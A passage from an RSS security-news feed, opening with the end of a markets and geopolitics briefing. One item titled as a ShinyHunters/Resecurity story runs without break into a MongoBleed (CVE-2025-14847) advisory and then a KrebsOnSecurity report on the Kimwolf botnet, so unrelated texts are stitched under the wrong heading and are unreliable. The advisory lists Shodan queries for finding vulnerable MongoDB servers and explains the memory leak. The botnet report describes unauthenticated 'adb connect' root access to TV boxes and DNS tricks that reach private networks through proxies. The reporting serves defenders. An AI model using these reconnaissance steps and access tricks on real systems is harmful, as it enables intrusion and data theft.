delivery declines and waning subsidies, Tesla’s stock defies logic through speculative narratives focused on AI, robotaxis, and humanoid robotics. Market valuation disconnects amplify volatility as investors wrestle between cult-like enthusiasm and fundamental skepticism. BYD’s systematic rise accentuates Tesla’s competitive vulnerabilities.Tech sector incumbents face AI-driven disruption; SaaS companies endure growth slowdowns amid pressure to integrate AI or risk obsolescence. Investors navigate shifting valuations, market rotations, and the challenges of differentiating transient corrections from structural changes.Federal Employee Benefits, Retirement, and Fiscal Policy Debates (T13)The UK’s pension triple lock becomes a flashpoint amid fiscal sustainability debates, facing bipartisan pressure due to demographic aging and funding burdens. Labour’s stealth taxes disproportionately affect working earners relative to pensioners, fueling resentment and political skepticism.DC’s public workforce grapples with slow vesting, modest contributions, and competing private sector opportunities affecting recruitment and retention. Federal pay hikes stagnate, telework options shrink, and morale deteriorates against a backdrop of workforce downsizing and leadership messaging misalignments.UK Social Welfare and Housing Prioritization Controversies (T14)Controversial allocation of scarce new-build social housing prioritizes migrants and asylum seekers, provoking widespread public fury amid growing homelessness and perceived displacement of native residents. Political discourse weaponizes allocation policies, fueling xenophobic mobilization benefiting nationalist factions.Council policies reportedly implement diversity criteria lacking transparency, exacerbating social anxiety. Opposing narratives depict migrants either as unjust beneficiaries or as crucial contributors. The accommodation cost trade-offs prompt debate on long-term sustainability and social cohesion.Biotech Speculation: Sellas Life Sciences and Clinical Trial Ambiguity (T15)Sellas Life Sciences’ stock rally exemplifies biotech’s speculative extremes: enthusiasm around a novel AML immunotherapy clashes with opaque trial data, CEO communication ambiguity, and imminent cash burn risks. Community-driven hype fuels volatile trading, conflating trial delays with positive signals amid diverging interpretations of statistical survival data.The mounting need for capital raises threatens dilution; regulatory shifts in drug pricing may constrain upside. The dichotomy between hopeful transformational therapy potential and harsh market skepticism underscores biotech’s investor psychology challenges.US Space Sector Rally, IPO Prospects, and Competition (T16)Space sector equities surged early 2026 amid anticipation of a SpaceX IPO targeting $1.5 trillion valuation. AST SpaceMobile and Rocket Lab benefited from operational milestones and investor fervor, yet concerns about Starlink’s potential market dominance and competitive coherence linger.Emerging markets for direct-to-device satellite broadband and responsive small launch vehicles highlight a fragmented but expanding landscape. The confluence of regulatory scrutiny, technological innovation, and market speculation shape sector trajectories amid great power space competition.Narratives and Fault LinesThe clearest narrative fissure lies between technological optimism and pragmatic realism, seen from Tesla’s investors caught between cultish hype and delivery setbacks, to biotech speculators balancing hope against data shadows in Sellas Life Sciences. This mirrors the broader divide in AI and automation discourse, where transformational aspirations contend with bubble warnings, emphasizing the tension between momentum investing and fundamental valuation discipline.On geopolitical fronts, observers diverge on the nature of China-India détente: optimists view it as path-breaking pragmatic diplomacy rooted in economic rationality, while sceptics see superficial stability masking an enduring strategic rivalry and nationalist edge. Similarly, in Southeast Asia, ASEAN-led peace efforts are hailed as progress by multilateralists but dismissed as fragile by regional nationalists who anticipate recurrence of conflict.In UK politics, Reform supporters reject compromise with traditional parties, insisting on ideological purity to restore national sovereignty, while pragmatic councillors and officials weigh tactical cooperation. Immigration policy debates split public opinion sharply between humanitarian concern and perceived national security threats, reinforcing political polarization that stifles constructive policy formation.Finance communities showcase interpretive divides between the risk-tolerant retail day traders striving for algorithmic mastery and the cautious investors advocating strict risk controls and process discipline. The psychological gulf between novices facing emotional breakdowns and veterans championing mentorship and journaling enlightenment exemplifies the human cost embedded in market participation.Hidden Risks and Early WarningsThe Russian banking sector’s loan quality masking and continued liquidity injections, juxtaposed with Central Bank reluctance to ease interest rates, portend a latent banking crisis with inflationary pressures. The opacity surrounding non-performing loans and restructured exposures leaves systemic fragility concealed, risking sudden market upheaval.US military aging platforms and diminished production capabilities-especially the 45% cut in F-35 procurement-expose a narrowing technological lead as Chinese naval expansion outpaces growth. Vulnerabilities around strategic reconnaissance satellites, such as Russia’s missile early-warning constellation breakdown, compound strategic uncertainty and raise escalation risks from miscalculations.In cybersecurity, HardBit 4.0 ransomware’s enhanced obfuscation and destructive capabilities signal an escalation in attacker operational security and weaponised malware, challenging incident response effectiveness. Simultaneously, retail trading's psychological strain and failures in risk management reveal systemic vulnerabilities where emotional lapses can precipitate rapid financial harm, exacerbated by prop firm business models designed for profitability at traders’ expense.The accelerating environmental crises outlined-from deforestation spikes to glacier retreat triggering volcanic activity-highlight ecological feedback loops with little institutional capacity for monitoring or adaptation, raising risks of nonlinear tipping points with severe socio-economic consequences.Possible Escalation PathsTactical border flare-ups between Thailand and Cambodia could reignite into broader conflict, undermining ASEAN’s fragile mediation and destabilizing regional economic integration, especially if nationalist pressures intensify during 2026 elections.Ukraine-Russia peace negotiations may collapse following escalatory provocations, including drone strikes and retaliatory Russian missile attacks, provoking expanded hostilities or complicating Western aid, with the newly appointed intelligence chief's leadership pivotal to conflict trajectory.US-Chinese strategic competition could spur accelerated missile production coupled with cyber and space contestation, amplifying risks of inadvertent crisis, as Russia’s degradation in strategic satellite capabilities leaves gaps exploitable by adversaries.Tesla’s production challenges coupled with aggressive Chinese EV industrial policy may trigger global market share realignments, pressuring US supply chains and investor confidence, inciting further volatility in technology equity valuations.UK domestic political fractures over immigration and legal controls risk unleashing civil unrest, especially if Reform party hardline tactics gain mass resonance amid perceived governance failures, fracturing social cohesion further.Ransomware evolution with destructive payloads could initiate targeted critical infrastructure sabotage, advancing from financial extortion to strategic disruption, particularly if attribution precision remains elusive and public-private defense coordination lags.Unanswered Questions To WatchHow durable will the China-India borderThis briefing is published live on the Newsdesk hub at  on the lab host.Browse all published Newsdesk briefings; each row links to a full edition snapshot.]]></content:encoded></item><item><title>ShinyHunters claims Resecurity hack, firm says it’s a honeypot</title><link>https://www.bleepingcomputer.com/news/security/shinyhunters-claims-resecurity-hack-firm-says-its-a-honeypot/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Sat, 3 Jan 2026 20:34:22 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The ShinyHunters hacking group claims it breached the systems of cybersecurity firm Resecurity and stole internal data, while Resecurity says the attackers only accessed a deliberately deployed honeypot containing fake information used to monitor their activity.

Note: this is not an RCE but a memory leak; nonetheless, RCE could likely follow.TL;DR for Engineering Teams: MongoDB’s zlib decompression mishandles buffer lengths.: Not an RCE but a memory leak; nonetheless, it could be chained with other popular RCEs such as React2Shell.: Uninitialized heap memory from the database process.: Over 87,000 internet-facing MongoDB instances observed.: Memory can contain credentials, tokens, PII, and internal paths.: Upgrade immediately or disable zlib compression.: Public PoC exists. Scanning is trivial. This will be abused.MongoDB is a popular database and has a memory access issue (MongoBleed).MongoDB supports network message compression. When a client sends a compressed message, it includes a field called uncompressedSize. MongoDB allocates a buffer of that size before passing the payload to zlib.Attacker sends a crafted message with an inflated uncompressedSize.MongoDB allocates a large heap buffer.zlib only decompresses the real payload into the start of that buffer.The remaining buffer space stays uninitialized.MongoDB treats the entire buffer as valid BSON.BSON parsing walks into leftover heap memory.At that point, the database starts leaking whatever was in memory previously.The challenge is: there is no crash. No auth failure. Just data bleeding out.The resemblance to Heartbleed is not accidental. Same class of bug. Same trust failure. Same outcome. The difference is that there is no known RCE attached to this yet…Campaign to identify if your libraries are affected by the MongoBleed CVE-2025-14847 in Leverage the Phoenix Security SCA Scanner and the container Docker image scanner to identify the vulnerability blast radius Leverage Phoenix Security Filters and the campaign method to update/ retrieve the new vulnerabilities, or import this file: Check the libraries not affected in SBOM screen to detect mongobleed (search the following libraries) Check Vulnerability Screen in Phoenix SecurityPOC and Exploit for CVE-2025-14847 (MongoBleed) A working proof of concept for CVE-2025-14847, commonly referred to as MongoBleed, is publicly available and demonstrates how trivial exploitation is once network access to a vulnerable MongoDB instance exists. The PoC, published by Joe Desimone, implements the exact compression-size mismatch condition that triggers uninitialized-heap disclosure by sending syntactically valid zlib-compressed messages with attacker-controlled uncompressed-length fields. The exploit requires no authentication, no malformed compression streams, and no timing conditions. Check out the exploit below and the lab to test here: The underlying mechanics and exploitation flow were first detailed in Kevin Beaumont’s technical analysis, which walks through the memory disclosure behavior and validates the issue against real MongoDB deployments. In addition to the original PoC, test harnesses and scanning tooling are available to reproduce the issue locally, assess exposed services, and validate vulnerable container images, including Docker-based environments. The availability of ready-to-run exploit code materially lowers the effort required to weaponize this vulnerability and increases the likelihood of opportunistic scanning against exposed MongoDB instances.Link – incident write-up and PoC testing notes.Exploit Lab, Network Scanner, and Code Scanner ToolingPhoenix Security clients can already verify results with SCA, the container registry scanner, and the external scanner for internet-exposed systems.To support validation, detection, and remediation workflows, Phoenix Security has released a full MongoBleed test suite that combines an exploit lab, a network scanner, and a code scanner in a single repository. You can access the repo and run the scanners from here.The exploit lab provides a controlled Docker-based environment with both vulnerable and patched MongoDB instances, allowing teams to safely reproduce the memory disclosure behavior and verify the effectiveness of upgrades by observing live heap leakage versus clean rejection paths. The network scanner enables rapid identification of exposed and vulnerable MongoDB services across individual hosts, CIDR ranges, or target lists, using the same compression mismatch logic as the PoC to confirm reachability and exploitability rather than relying on version strings alone. The code scanner extends this coverage into build and supply chain workflows by inspecting repositories, Dockerfiles, and infrastructure definitions to detect vulnerable MongoDB versions before deployment, with optional direct upload into Phoenix Security for attribution, prioritization, and tracking. Root Cause and Technical DetailsCVE-2025-14847 (MongoBleed) is caused by an incorrect propagation of decompression length semantics in MongoDB’s network transport layer when processing compressed wire-protocol messages.The vulnerability resides in MongoDB’s zlib message compression implementation, specifically in:src/mongo/transport/message_compressor_zlib.cppWhen a client negotiates  and submits a compressed message, MongoDB allocates an output buffer based on the declared uncompressed size provided in the message metadata. The server then invokes  to inflate the payload into this buffer.In the vulnerable implementation, the decompression routine returns , which corresponds to the size of the allocated output buffer, rather than the number of bytes actually written by the decompressor. As a result, MongoDB treats the entire buffer as valid decompressed data, even though only a portion of it contains legitimate payload.This mismatch allows subsequent BSON parsing logic to read beyond the true decompression boundary and into uninitialized heap memory, leading to unauthenticated memory disclosure.The issue was fixed by returning the actual decompressed byte count instead of the allocated buffer length, as shown in MongoDB’s official patch:If an attacker supplies a syntactically valid compressed message whose declared uncompressed size exceeds the real decompressed length, MongoDB treats the entire allocated buffer as valid decompressed data. Subsequent message parsing and BSON handling logic consume memory beyond the true decompression boundary, resulting in the exposure of uninitialized heap memory.This condition is reachable without authentication and does not require malformed compression streams or memory corruption primitives. The exploit relies solely on a  between attacker-controlled metadata and the actual decompression output, combined with the incorrect return of allocated buffer length. The vulnerability is reliably triggered after compression negotiation and prior to authentication checks, making it reachable by any network client.The issue was remediated by modifying the decompression path to return the actual decompressed byte count (return length;) instead of the allocated buffer size. Additional regression tests were introduced in message_compressor_manager_test.cpp to explicitly detect and reject undersized decompression results, ensuring that future mismatches between declared and real decompressed sizes result in a controlled error (ErrorCodes::BadValue) rather than memory disclosure.src/mongo/transport/message_compressor_zlib.cppThe fix replaces return {output.length()}; with return length;, ensuring that only the true decompressed byte count is propagated, preventing BSON parsing from walking into uninitialized memory.How Widespread Is CVE-2025-14847 (MongoBleed)?MongoDB is one of the most widely deployed database platforms on the internet, and its exposure footprint directly amplifies the risk posed by MongoBleed. We are looking at 213,490 potentially vulnerable systems on Shodan.Current Shodan telemetry identifies 213,490 publicly reachable MongoDB instances, many of which advertise versions that fall squarely within the vulnerable ranges for CVE-2025-14847.Those figures were captured on December 29, 2025.product:”MongoDB” port:27017product:”MongoDB” port:27017 “8.2.”product:”MongoDB” port:27017 “8.0.” -“8.0.17”product:”MongoDB” port:27017 “7.0.” -“7.0.28”product:”MongoDB” port:27017 “6.0.” -“6.0.27”product:”MongoDB” port:27017 “5.0.” -“5.0.32”product:”MongoDB” port:27017 “4.4.” -“4.4.30”product:”MongoDB” port:27017 “4.2.”product:”MongoDB” port:27017 “4.0.”product:”MongoDB” port:27017 “3.6.”Distribution of various MongoDB versions.The distribution spans cloud providers, managed hosting environments, and self-hosted deployments, with a heavy concentration on the default MongoDB port , indicating direct internet exposure rather than controlled access through application tiers.

The vulnerability at issue has been exploited for months already, and it’s time for a broader awareness of the threat. The short version is that everything you thought you knew about the security of the internal network behind your Internet router probably is now dangerously out of date.The security company Synthient currently sees more than 2 million infected Kimwolf devices distributed globally but with concentrations in Vietnam, Brazil, India, Saudi Arabia, Russia and the United States. Synthient found that two-thirds of the Kimwolf infections are Android TV boxes with no security or authentication built in.The past few months have witnessed the explosive growth of a new botnet dubbed , which experts say has infected more than 2 million devices globally. The Kimwolf malware forces compromised systems to relay malicious and abusive Internet traffic — such as ad fraud, account takeover attempts and mass content scraping — and participate in crippling distributed denial-of-service (DDoS) attacks capable of knocking nearly any website offline for days at a time.More important than Kimwolf’s staggering size, however, is the diabolical method it uses to spread so quickly: By effectively tunneling back through various “residential proxy” networks and into the local networks of the proxy endpoints, and by further infecting devices that are hidden behind the assumed protection of the user’s firewall and Internet router.Residential proxy networks are sold as a way for customers to anonymize and localize their Web traffic to a specific region, and the biggest of these services allow customers to route their traffic through devices in virtually any country or city around the globe.The malware that turns an end-user’s Internet connection into a proxy node is often bundled with dodgy mobile apps and games. These residential proxy programs also are commonly installed via unofficial Android TV boxes sold by third-party merchants on popular e-commerce sites like , , and .These TV boxes range in price from $40 to $400, are marketed under a dizzying range of no-name brands and model numbers, and frequently are advertised as a way to stream certain types of subscription video content for free. But there’s a hidden cost to this transaction: As we’ll explore in a moment, these TV boxes make up a considerable chunk of the estimated two million systems currently infected with Kimwolf.Some of the unsanctioned Android TV boxes that come with residential proxy malware pre-installed. Image: Synthient.Kimwolf also is quite good at infecting a range of Internet-connected digital photo frames that likewise are abundant at major e-commerce websites. In November 2025, researchers from  published a report (PDF) detailing serious security issues in Android-based digital picture frames running the including Amazon’s bestselling digital frame as of March 2025.There are two major security problems with these photo frames and unofficial Android TV boxes. The first is that a considerable percentage of them come with malware pre-installed, or else require the user to download an unofficial Android App Store and malware in order to use the device for its stated purpose (video content piracy). The most typical of these uninvited guests are small programs that turn the device into a residential proxy node that is resold to others.The second big security nightmare with these photo frames and unsanctioned Android TV boxes is that they rely on a handful of Internet-connected microcomputer boards that have no discernible security or authentication requirements built-in. In other words, if you are on the same network as one or more of these devices, you can likely compromise them simultaneously by issuing a single command across the network.THERE’S NO PLACE LIKE 127.0.0.1The combination of these two security realities came to the fore in October 2025, when an undergraduate computer science student at the Rochester Institute of Technology began closely tracking Kimwolf’s growth, and interacting directly with its apparent creators on a daily basis.is the 22-year-old founder of the security firm , a startup that helps companies detect proxy networks and learn how those networks are being abused. Conducting much of his research into Kimwolf while studying for final exams, Brundage told KrebsOnSecurity in late October 2025 he suspected Kimwolf was a new Android-based variant of , a botnet that was incorrectly blamed for a number of record-smashing DDoS attacks last fall.Brundage says Kimwolf grew rapidly by abusing a glaring vulnerability in many of the world’s largest residential proxy services. The crux of the weakness, he explained, was that these proxy services weren’t doing enough to prevent their customers from forwarding requests to internal servers of the individual proxy endpoints.Most proxy services take basic steps to prevent their paying customers from “going upstream” into the local network of proxy endpoints, by explicitly denying requests for local addresses specified in RFC-1918, including the well-known Network Address Translation (NAT) ranges 10.0.0.0/8, 192.168.0.0/16, and 172.16.0.0/12. These ranges allow multiple devices in a private network to access the Internet using a single public IP address, and if you run any kind of home or office network, your internal address space operates within one or more of these NAT ranges.However, Brundage discovered that the people operating Kimwolf had figured out how to talk directly to devices on the internal networks of millions of residential proxy endpoints, simply by changing their  (DNS) settings to match those in the RFC-1918 address ranges.“It is possible to circumvent existing domain restrictions by using DNS records that point to 192.168.0.1 or 0.0.0.0,” Brundage wrote in a first-of-its-kind security advisory sent to nearly a dozen residential proxy providers in mid-December 2025. “This grants an attacker the ability to send carefully crafted requests to the current device or a device on the local network. This is actively being exploited, with attackers leveraging this functionality to drop malware.”As with the digital photo frames mentioned above, many of these residential proxy services run solely on mobile devices that are running some game, VPN or other app with a hidden component that turns the user’s mobile phone into a residential proxy — often without any meaningful consent.In a report published today, Synthient said key actors involved in Kimwolf were observed monetizing the botnet through app installs, selling residential proxy bandwidth, and selling its DDoS functionality.“Synthient expects to observe a growing interest among threat actors in gaining unrestricted access to proxy networks to infect devices, obtain network access, or access sensitive information,” the report observed. “Kimwolf highlights the risks posed by unsecured proxy networks and their viability as an attack vector.”After purchasing a number of unofficial Android TV box models that were most heavily represented in the Kimwolf botnet, Brundage further discovered the proxy service vulnerability was only part of the reason for Kimwolf’s rapid rise: He also found virtually all of the devices he tested were shipped from the factory with a powerful feature called  (ADB) mode enabled by default.Many of the unofficial Android TV boxes infected by Kimwolf include the ominous disclaimer: “Made in China. Overseas use only.” Image: Synthient.ADB is a diagnostic tool intended for use solely during the manufacturing and testing processes, because it allows the devices to be remotely configured and even updated with new (and potentially malicious) firmware. However, shipping these devices with ADB turned on creates a security nightmare because in this state they constantly listen for and accept unauthenticated connection requests.For example, opening a command prompt and typing “adb connect” along with a vulnerable device’s (local) IP address followed immediately by “:5555” will very quickly offer unrestricted “super user” administrative access.Brundage said by early December, he’d identified a one-to-one overlap between new Kimwolf infections and proxy IP addresses offered for rent by China-based , currently the world’s largest residential proxy network by all accounts.“Kimwolf has almost doubled in size this past week, just by exploiting IPIDEA’s proxy pool,” Brundage told KrebsOnSecurity in early December as he was preparing to notify IPIDEA and 10 other proxy providers about his research.Brundage said Synthient first confirmed on December 1, 2025 that the Kimwolf botnet operators were tunneling back through IPIDEA’s proxy network and into the local networks of systems running IPIDEA’s proxy software. The attackers dropped the malware payload by directing infected systems to visit a specific Internet address and to call out the pass phrase “” in order to unlock the malicious download.On December 30, Synthient said it was tracking roughly 2 million IPIDEA addresses exploited by Kimwolf in the previous week. Brundage said he has witnessed Kimwolf rebuilding itself after one recent takedown effort targeting its control servers — from almost nothing to two million infected systems just by tunneling through proxy endpoints on IPIDEA for a couple of days.Brundage said IPIDEA has a seemingly inexhaustible supply of new proxies, advertising access to more than 100 million residential proxy endpoints around the globe in the past week alone. Analyzing the exposed devices that were part of IPIDEA’s proxy pool, Synthient said it found more than two-thirds were Android devices that could be compromised with no authentication needed.SECURITY NOTIFICATION AND RESPONSEAfter charting a tight overlap in Kimwolf-infected IP addresses and those sold by IPIDEA, Brundage was eager to make his findings public: The vulnerability had clearly been exploited for several months, although it appeared that only a handful of cybercrime actors were aware of the capability. But he also knew that going public without giving vulnerable proxy providers an opportunity to understand and patch it would only lead to more mass abuse of these services by additional cybercriminal groups.On December 17, Brundage sent a security notification to all 11 of the apparently affected proxy providers, hoping to give each at least a few weeks to acknowledge and address the core problems identified in his report before he went public. Many proxy providers who received the notification were resellers of IPIDEA that white-labeled the company’s service.KrebsOnSecurity first sought comment from IPIDEA in October 2025, in reporting on a story about how the proxy network appeared to have benefitted from the rise of the Aisuru botnet, whose administrators appeared to shift from using the botnet primarily for DDoS attacks to simply installing IPIDEA’s proxy program, among others.On December 25, KrebsOnSecurity received an email from an IPIDEA employee identified only as “,” who said allegations that IPIDEA had benefitted from Aisuru’s rise were baseless.“After comprehensively verifying IP traceability records and supplier cooperation agreements, we found no association between any of our IP resources and the Aisuru botnet, nor have we received any notifications from authoritative institutions regarding our IPs being involved in malicious activities,” Oliver wrote. “In addition, for external cooperation, we implement a three-level review mechanism for suppliers, covering qualification verification, resource legality authentication and continuous dynamic monitoring, to ensure no compliance risks throughout the entire cooperation process.”“IPIDEA firmly opposes all forms of unfair competition and malicious smearing in the industry, always participates in market competition with compliant operation and honest cooperation, and also calls on the entire industry to jointly abandon irregular and unethical behaviors and build a clean and fair market ecosystem,” Oliver continued.Meanwhile, the same day that Oliver’s email arrived, Brundage shared a response he’d just received from IPIDEA’s security officer, who identified himself only by the first name . The security officer said IPIDEA had made a number of important security changes to its residential proxy service to address the vulnerability identified in Brundage’s report.“By design, the proxy service does not allow access to any internal or local address space,” Byron explained. “This issue was traced to a legacy module used solely for testing and debugging purposes, which did not fully inherit the internal network access restrictions. Under specific conditions, this module could be abused to reach internal resources. The affected paths have now been fully blocked and the module has been taken offline.”Byron told Brundage IPIDEA also instituted multiple mitigations for blocking DNS resolution to internal (NAT) IP ranges, and that it was now blocking proxy endpoints from forwarding traffic on “high-risk” ports “to prevent abuse of the service for scanning, lateral movement, or access to internal services.”An excerpt from an email sent by IPIDEA’s security officer in response to Brundage’s vulnerability notification. Click to enlarge.Brundage said IPIDEA appears to have successfully patched the vulnerabilities he identified. He also noted he never observed the Kimwolf actors targeting proxy services other than IPIDEA, which has not responded to requests for comment. is founder of Spur.us, a technology firm that helps companies identify and filter out proxy traffic. Kilmer said Spur has tested Brundage’s findings and confirmed that IPIDEA and all of its affiliate resellers indeed allowed full and unfiltered access to the local LAN.“And since Superbox turns the IP into an IPIDEA proxy, a bad actor just has to use the proxy to localhost on that port and install whatever bad SDKs [software development kits] they want,” Kilmer told KrebsOnSecurity.Superbox media streaming boxes for sale on Walmart.com.Both Brundage and Kilmer say IPIDEA appears to be the second or third reincarnation of a residential proxy network formerly known as , a service that operated between 2014 and 2022 and was wildly popular on cybercrime forums. 911S5 Proxy imploded a week after KrebsOnSecurity published a deep dive on the service’s sketchy origins and leadership in China.In that 2022 profile, we cited work by researchers at the  in Canada who were studying the threat 911S5 could pose to internal corporate networks. The researchers noted that “the infection of a node enables the 911S5 user to access shared resources on the network such as local intranet portals or other services.”“It also enables the end user to probe the LAN network of the infected node,” the researchers explained. “Using the internal router, it would be possible to poison the DNS cache of the LAN router of the infected node, enabling further attacks.”911S5 initially responded to our reporting in 2022 by claiming it was conducting a top-down security review of the service. But the proxy service abruptly closed up shop just one week later, saying a malicious hacker had destroyed all of the company’s customer and payment records. In July 2024, The U.S. Department of the Treasurysanctioned the alleged creators of 911S5, and the U.S. Department of Justice arrested the Chinese national named in my 2022 profile of the proxy service.Kilmer said IPIDEA also operates a sister service called , which the company has pitched from Day One as a seamless alternative to 911S5 Proxy.“You cannot tell me they don’t want the 911 customers by calling it that,” Kilmer said.Among the recipients of Synthient’s notification was the proxy giant . Brundage shared an email he received from Oxylabs’ security team on December 31, which acknowledged Oxylabs had started rolling out security modifications to address the vulnerabilities described in Synthient’s report.Reached for comment, Oxylabs confirmed they “have implemented changes that now eliminate the ability to bypass the blocklist and forward requests to private network addresses using a controlled domain.” But it said there is no evidence that Kimwolf or other other attackers exploited its network.“In parallel, we reviewed the domains identified in the reported exploitation activity and did not observe traffic associated with them,” the Oxylabs statement continued. “Based on this review, there is no indication that our residential network was impacted by these activities.”Consider the following scenario, in which the mere act of allowing someone to use your Wi-Fi network could lead to a Kimwolf botnet infection. In this example, a friend or family member comes to stay with you for a few days, and you grant them access to your Wi-Fi without knowing that their mobile phone is infected with an app that turns the device into a residential proxy node. At that point, your home’s public IP address will show up for rent at the website of some residential proxy provider.Miscreants like those behind Kimwolf then use residential proxy services online to access that proxy node on your IP, tunnel back through it and into your local area network (LAN), and automatically scan the internal network for devices with Android Debug Bridge mode turned on.By the time your guest has packed up their things, said their goodbyes and disconnected from your Wi-Fi, you now have two devices on your local network — a digital photo frame and an unsanctioned Android TV box — that are infected with Kimwolf. You may have never intended for these devices to be exposed to the larger Internet, and yet there you are.Here’s another possible nightmare scenario: Attackers use their access to proxy networks to modify your Internet router’s settings so that it relies on malicious DNS servers controlled by the attackers — allowing them to control where your Web browser goes when it requests a website. Think that’s far-fetched? Recall the DNSChanger malware from 2012 that infected more than a half-million routers with search-hijacking malware, and ultimately spawned an entire security industry working group focused on containing and eradicating it.Much of what is published so far on Kimwolf has come from the Chinese security firm , which was the first to chronicle the rise of the Aisuru botnet in late 2024. In its latest blog post, XLab said it began tracking Kimwolf on October 24, when the botnet’s control servers were swamping Cloudflare’s DNS servers with lookups for the distinctive domain 14emeliaterracewestroxburyma02132[.]su.This domain and others connected to early Kimwolf variants spent several weeks topping Cloudflare’s chart of the Internet’s most sought-after domains, edging out Google.com and Apple.com of their rightful spots in the top 5 most-requested domains. That’s because during that time Kimwolf was asking its millions of bots to check in frequently using Cloudflare’s DNS servers.The Chinese security firm XLab found the Kimwolf botnet had enslaved between 1.8 and 2 million devices, with heavy concentrations in Brazil, India, The United States of America and Argentina. Image: blog.xLab.qianxin.comIt is clear from reading the XLab report that KrebsOnSecurity (and security experts) probably erred in misattributing some of Kimwolf’s early activities to the Aisuru botnet, which appears to be operated by a different group entirely. IPDEA may have been truthful when it said it had no affiliation with the Aisuru botnet, but Brundage’s data left no doubt that its proxy service clearly was being massively abused by Aisuru’s Android variant, Kimwolf.XLab said Kimwolf has infected at least 1.8 million devices, and has shown it is able to rebuild itself quickly from scratch.“Analysis indicates that Kimwolf’s primary infection targets are TV boxes deployed in residential network environments,” XLab researchers wrote. “Since residential networks usually adopt dynamic IP allocation mechanisms, the public IPs of devices change over time, so the true scale of infected devices cannot be accurately measured solely by the quantity of IPs. In other words, the cumulative observation of 2.7 million IP addresses does not equate to 2.7 million infected devices.”XLab said measuring Kimwolf’s size also is difficult because infected devices are distributed across multiple global time zones. “Affected by time zone differences and usage habits (e.g., turning off devices at night, not using TV boxes during holidays, etc.), these devices are not online simultaneously, further increasing the difficulty of comprehensive observation through a single time window,” the blog post observed.XLab noted that the Kimwolf author shows an almost ‘obsessive’ fixation” on Yours Truly, apparently leaving “easter eggs” related to my name in multiple places through the botnet’s code and communications:One frustrating aspect of threats like Kimwolf is that in most cases it is not easy for the average user to determine if there are any devices on their internal network which may be vulnerable to threats like Kimwolf and/or already infected with residential proxy malware.Let’s assume that through years of security training or some dark magic you can successfully identify that residential proxy activity on your internal network was linked to a specific mobile device inside your house: From there, you’d still need to isolate and remove the app or unwanted component that is turning the device into a residential proxy.Also, the tooling and knowledge needed to achieve this kind of visibility just isn’t there from an average consumer standpoint. The work that it takes to configure your network so you can see and interpret logs of all traffic coming in and out is largely beyond the skillset of most Internet users (and, I’d wager, many security experts). But it’s a topic worth exploring in an upcoming story.If you own a TV box that matches one of these model names and/or numbers, please just rip it out of your network. If you encounter one of these devices on the network of a family member or friend, send them a link to this story and explain that it’s not worth the potential hassle and harm created by keeping them plugged in.The top 15 product devices represented in the Kimwolf botnet, according to Synthient. is a principal security researcher with . Seaman said he wants more consumers to be wary of these pseudo Android TV boxes to the point where they avoid them altogether.“I want the consumer to be paranoid of these crappy devices and of these residential proxy schemes,” he said. “We need to highlight why they’re dangerous to everyone and to the individual. The whole security model where people think their LAN (Local Internal Network) is safe, that there aren’t any bad guys on the LAN so it can’t be that dangerous is just really outdated now.”“The idea that an app can enable this type of abuse on my network and other networks, that should really give you pause,” about which devices to allow onto your local network, Seaman said. “And it’s not just Android devices here. Some of these proxy services have SDKs for Mac and Windows, and the iPhone. It could be running something that inadvertently cracks open your network and lets countless random people inside.”In July 2025, Google filed a “John Doe” lawsuit (PDF) against 25 unidentified defendants collectively dubbed the “,” which Google described as a botnet of over ten million unsanctioned Android streaming devices engaged in advertising fraud. Google said the BADBOX 2.0 botnet, in addition to compromising multiple types of devices prior to purchase, also can infect devices by requiring the download of malicious apps from unofficial marketplaces.Google’s lawsuit came on the heels of a June 2025 advisory from the Federal Bureau of Investigation (FBI), which warned that cyber criminals were gaining unauthorized access to home networks by either configuring the products with malware prior to the user’s purchase, or infecting the device as it downloads required applications that contain backdoors — usually during the set-up process.The FBI said BADBOX 2.0 was discovered after the original BADBOX campaign was disrupted in 2024. The original BADBOX was identified in 2023, and primarily consisted of Android operating system devices that were compromised with backdoor malware prior to purchase. is vice president of threat intelligence at , a company that worked closely on the BADBOX investigations. Kaye said the BADBOX botnets and the residential proxy networks that rode on top of compromised devices were detected because they enabled a ridiculous amount of advertising fraud, as well as ticket scalping, retail fraud, account takeovers and content scraping.Kaye said consumers should stick to known brands when it comes to purchasing things that require a wired or wireless connection.“If people are asking what they can do to avoid being victimized by proxies, it’s safest to stick with name brands,” Kaye said. “Anything promising something for free or low-cost, or giving you something for nothing just isn’t worth it. And be careful about what apps you allow on your phone.”Many wireless routers these days make it relatively easy to deploy a “Guest” wireless network on-the-fly. Doing so allows your guests to browse the Internet just fine but it blocks their device from being able to talk to other devices on the local network — such as shared folders, printers and drives. If someone — a friend, family member, or contractor — requests access to your network, give them the guest Wi-Fi network credentials if you have that option.There is a small but vocal pro-piracy camp that is almost condescendingly dismissive of the security threats posed by these unsanctioned Android TV boxes. These tech purists positively chafe at the idea of people wholesale discarding one of these TV boxes. A common refrain from this camp is that Internet-connected devices are not inherently bad or good, and that even factory-infected boxes can be flashed with new firmware or custom ROMs that contain no known dodgy software.However, it’s important to point out that the majority of people buying these devices are not security or hardware experts; the devices are sought out because they dangle something of value for “free.” Most buyers have no idea of the bargain they’re making when plugging one of these dodgy TV boxes into their network.It is somewhat remarkable that we haven’t yet seen the entertainment industry applying more visible pressure on the major e-commerce vendors to stop peddling this insecure and actively malicious hardware that is largely made and marketed for video piracy. These TV boxes are a public nuisance for bundling malicious software while having no apparent security or authentication built-in, and these two qualities make them an attractive nuisance for cybercriminals.Stay tuned for Part II in this series, which will poke through clues left behind by the people who appear to have built Kimwolf and benefited from it the most.]]></content:encoded></item><item><title>Trust Wallet links $8.5 million crypto theft to Shai-Hulud NPM attack</title><link>https://www.bleepingcomputer.com/news/security/trust-wallet-links-85-million-crypto-theft-to-shai-hulud-npm-attack/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 2 Jan 2026 14:19:40 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Trust Wallet believes the compromise of its web browser to steal roughly $8.5 million from over 2,500 crypto wallets is likely related to an "industry-wide" Sha1-Hulud attack in November.

